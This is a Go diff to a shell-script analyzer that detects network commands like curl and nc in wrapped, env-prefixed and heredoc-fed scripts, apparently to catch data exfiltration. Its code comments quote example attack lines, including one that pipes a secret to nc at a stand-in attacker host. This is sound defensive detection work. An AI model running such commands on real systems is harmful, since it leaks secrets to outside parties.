@@ -502,6 +502,17 @@ type NetworkCommandCall struct {
 	Position    syntax.Pos
 	InCmdSubst  bool
 	InPipe      bool
+	// InnerScript is the literal script text when this call was extracted from
+	// a wrapper such as `bash -c '...'` / `eval '...'`. Empty when the call is
+	// found in the outer script directly. Downstream analyses that need to
+	// resolve shell-variable assignments in scope of the call should use this
+	// (with InnerOffset) instead of the outer script — assignments inside the
+	// wrapper's quoted body are otherwise invisible to outer-script regexes.
+	InnerScript string
+	// InnerOffset is the call's byte offset within InnerScript before
+	// rewriteCallPositions overwrites Position. Meaningless when InnerScript
+	// is empty.
+	InnerOffset uint
 }
 
 type CommandArg struct {
@@ -811,9 +822,26 @@ func (p *ShellParser) networkCommandAfterCommandWrapper(call *syntax.CallExpr, s
 }
 
 func (p *ShellParser) networkCommandAfterEnvWrapper(call *syntax.CallExpr) (int, string, bool) {
+	consuming := envOptionsConsumingNextArg()
 	for idx := 1; idx < len(call.Args); idx++ {
 		value := p.commandWordValue(call.Args[idx])
-		if value == "--" || strings.HasPrefix(value, "-") {
+		if value == "--" {
+			continue
+		}
+		if strings.HasPrefix(value, "--") {
+			option := value
+			if eqIdx := strings.Index(option, "="); eqIdx >= 0 {
+				option = option[:eqIdx]
+			}
+			if consuming[option] && !strings.Contains(value, "=") {
+				idx++
+			}
+			continue
+		}
+		if strings.HasPrefix(value, "-") && value != "-" {
+			if consuming[value] {
+				idx++
+			}
 			continue
 		}
 		if strings.Contains(value, "=") && !strings.HasPrefix(value, "=") {
@@ -825,6 +853,19 @@ func (p *ShellParser) networkCommandAfterEnvWrapper(call *syntax.CallExpr) (int,
 		return -1, "", false
 	}
 	return -1, "", false
+}
+
+// envOptionsConsumingNextArg returns the env(1) options that take a following
+// argument. Without consuming the operand, a call such as
+// `env -u OLD_TOKEN curl ...` would be misclassified: OLD_TOKEN would be
+// inspected as the wrapped command, fail isNetworkCommand, and the actual curl
+// be silently dropped from detection.
+func envOptionsConsumingNextArg() map[string]bool {
+	return map[string]bool{
+		"-u": true, "--unset": true,
+		"-C": true, "--chdir": true,
+		"-S": true, "--split-string": true,
+	}
 }
 
 func (p *ShellParser) networkCommandAfterOptionWrapper(call *syntax.CallExpr, consumingOptions map[string]bool) (int, string, bool) {
@@ -920,7 +961,17 @@ func (p *ShellParser) walkInlineScript(script string, fallbackPos syntax.Pos, ct
 	innerCtx := *ctx
 	inner.walkForNetworkCommands(inner.file, &innerCtx, calls)
 	for i := before; i < len(*calls); i++ {
-		rewriteCallPositions(&(*calls)[i], fallbackPos)
+		c := &(*calls)[i]
+		// Preserve the SHALLOWEST inner script that contains this call.
+		// Nested wrappers (`bash -c 'eval "..."'`) call walkInlineScript
+		// recursively; the innermost run sets InnerScript first, outer
+		// runs must not overwrite it because shell-assignment resolution
+		// needs the script in which the curl actually sits.
+		if c.InnerScript == "" {
+			c.InnerScript = script
+			c.InnerOffset = c.Position.Offset()
+		}
+		rewriteCallPositions(c, fallbackPos)
 	}
 }
 
@@ -1094,6 +1145,25 @@ func (p *ShellParser) collectPipeInputArgsInto(node syntax.Node, args *[]Command
 		p.collectPipeInputArgsInto(x.Cmd, args)
 		for _, redirect := range x.Redirs {
 			p.collectPipeInputArgsInto(redirect, args)
+		}
+	case *syntax.Redirect:
+		// Producer-side stdin redirects (heredoc, here-string) carry
+		// content the producer streams to its stdout, which then flows
+		// through the pipe to the consumer. Without this case, a script
+		// like `cat <<EOF | nc attacker 443\nSECRET\nEOF` loses the
+		// secret entirely from PipeInputs.
+		if x.N != nil && x.N.Value != "0" {
+			return
+		}
+		switch x.Op {
+		case syntax.WordHdoc:
+			if x.Word != nil {
+				*args = append(*args, p.parseCommandArg(x.Word))
+			}
+		case syntax.Hdoc, syntax.DashHdoc:
+			if x.Hdoc != nil {
+				*args = append(*args, p.parseCommandArg(x.Hdoc))
+			}
 		}
 	case *syntax.CallExpr:
 		if len(x.Args) < 2 {
